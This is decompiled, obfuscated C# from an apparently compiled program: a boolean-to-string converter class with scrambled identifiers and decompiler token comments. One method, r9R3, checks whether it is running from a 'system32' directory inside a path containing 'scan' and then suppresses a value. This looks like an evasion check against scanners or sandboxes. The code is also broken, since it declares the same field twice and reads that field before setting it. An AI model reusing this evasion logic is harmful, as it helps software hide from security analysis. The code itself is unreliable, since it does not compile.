using System;
using System.ComponentModel;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using My;
using So;

namespace Ex
{
	// Token: 0x02000014 RID: 20
	internal sealed class y7 : BooleanConverter
	{
		// Token: 0x06000058 RID: 88 RVA: 0x00007C70 File Offset: 0x00005E70
		public y7()
		{
			this.R = new string[]
			{
				Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.R, null, "Resources", new object[0], null, null, null), null, "Strings", new object[0], null, null, null), null, "lit_false", new object[0], null, null, null)),
				Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.R, null, "Resources", new object[0], null, null, null), null, "Strings", new object[0], null, null, null), null, "lit_true", new object[0], null, null, null))
			};
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00007D24 File Offset: 0x00005F24
		public object r4T3(ITypeDescriptorContext A_1, CultureInfo A_2, object A_3, Type A_4)
		{
			bool flag = A_3 is bool && A_4 == typeof(string);
			object result;
			if (flag)
			{
				result = this.R[Conversions.ToBoolean(A_3) ? 1 : 0];
			}
			else
			{
				result = base.ConvertTo(A_1, A_2, RuntimeHelpers.GetObjectValue(A_3), A_4);
			}
			return result;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00007D80 File Offset: 0x00005F80
		internal static object Da9i(object A_0)
		{
			bool flag = y7.r9R3();
			object result;
			if (flag)
			{
				result = null;
			}
			else
			{
				result = A_0;
			}
			return result;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00007DA4 File Offset: 0x00005FA4
		private static bool r9R3()
		{
			bool flag = !Yq.Qt();
			checked
			{
				bool result;
				if (flag)
				{
					result = true;
				}
				else
				{
					int num = 0;
					object value = Directory.GetCurrentDirectory().ToLower().Split(new char[]
					{
						'\\'
					}).Last<string>();
					string directoryName = Path.GetDirectoryName(Application.ExecutablePath);
					bool flag2 = Tf.Qw(Conversions.ToString(value), "ystem32");
					if (flag2)
					{
						num++;
					}
					bool flag3 = Tf.Qw(directoryName, "scan");
					if (flag3)
					{
						num++;
					}
					bool flag4 = num >= 2;
					result = flag4;
				}
				return result;
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00007E38 File Offset: 0x00006038
		public object Fw2i(ITypeDescriptorContext A_1, CultureInfo A_2, object A_3)
		{
			string right = A_3 as string;
			bool flag = Operators.CompareString(this.R[0], right, false) == 0;
			object result;
			if (flag)
			{
				result = false;
			}
			else
			{
				bool flag2 = Operators.CompareString(this.R[1], right, false) == 0;
				if (flag2)
				{
					result = true;
				}
				else
				{
					result = base.ConvertFrom(A_1, A_2, RuntimeHelpers.GetObjectValue(A_3));
				}
			}
			return result;
		}

		// Token: 0x0400005C RID: 92
		private readonly string[] R;

		// Token: 0x0400005D RID: 93
		private object R;
	}
}
